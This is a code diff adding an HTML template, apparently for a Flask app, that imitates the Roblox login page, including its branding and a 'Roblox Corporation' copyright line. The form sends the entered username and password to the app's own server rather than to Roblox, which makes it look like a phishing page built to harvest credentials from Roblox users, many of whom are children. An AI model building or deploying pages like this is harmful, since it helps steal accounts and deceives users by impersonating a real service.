@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Roblox - Login</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+
+  <!-- Navigation Bar -->
+  <header class="navbar">
+    <div class="nav-container">
+      <a href="#" class="logo-link">
+        <!-- Roblox Style Square Logo Icon -->
+        <svg class="roblox-logo" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+          <rect x="20" y="20" width="60" height="60" rx="12" fill="#ffffff" transform="rotate(-15 50 50)" />
+          <rect x="42" y="42" width="16" height="16" rx="3" fill="#191B1D" transform="rotate(-15 50 50)" />
+        </svg>
+      </a>
+      <div class="nav-right">
+        <span class="nav-text">Don't have an account?</span>
+        <button class="btn-secondary signup-btn">Sign Up</button>
+      </div>
+    </div>
+  </header>
+
+  <!-- Main Content Area -->
+  <main class="main-container">
+    <div class="login-card">
+      <h1 class="login-title">Login to Roblox</h1>
+
+      <form class="login-form" action="/" method="POST">
+        <div class="input-group">
+          <input 
+            type="text" 
+            id="username" 
+            name="username" 
+            placeholder="Username/Email/Phone" 
+            required 
+            autocomplete="username"
+          />
+        </div>
+
+        <div class="input-group">
+          <input 
+            type="password" 
+            id="password" 
+            name="password" 
+            placeholder="Password" 
+            required 
+            autocomplete="current-password"
+          />
+        </div>
+
+        {% if message %}
+            <p style="color: red; font-style: italic;">{{ message }}</p>
+        {% endif %}
+
+        <button type="submit" class="btn-primary login-btn">Log In</button>
+      </form>
+
+      <div class="login-links">
+        <a href="#" class="forgot-link">Forgot Password or Username?</a>
+      </div>
+
+      <div class="divider">
+        <span>or</span>
+      </div>
+
+      <!-- Alternative Login Options -->
+      <div class="alternative-logins">
+        <button class="btn-alt">
+          <svg class="alt-icon" viewBox="0 0 24 24" fill="currentColor">
+            <path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4zM14 13h-3v3H9v-3H6v-2h3V8h2v3h3v2z"/>
+          </svg>
+          Another Log In Device
+        </button>
+
+        <button class="btn-alt">
+          <svg class="alt-icon" viewBox="0 0 24 24" fill="currentColor">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.2 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/>
+          </svg>
+
+          Email Me a One-Time Code
+        </button>
+      </div>
+    </div>
+  </main>
+
+  <!-- Footer -->
+  <footer class="footer">
+    <div class="footer-links">
+      <a href="#">Help</a>
+      <a href="#">Privacy</a>
+      <a href="#">Terms</a>
+      <a href="#">Parents</a>
+    </div>
+    <p class="copyright">&copy; 2026 Roblox Corporation. All rights reserved.</p>
+  </footer>
+
+</body>
+</html>
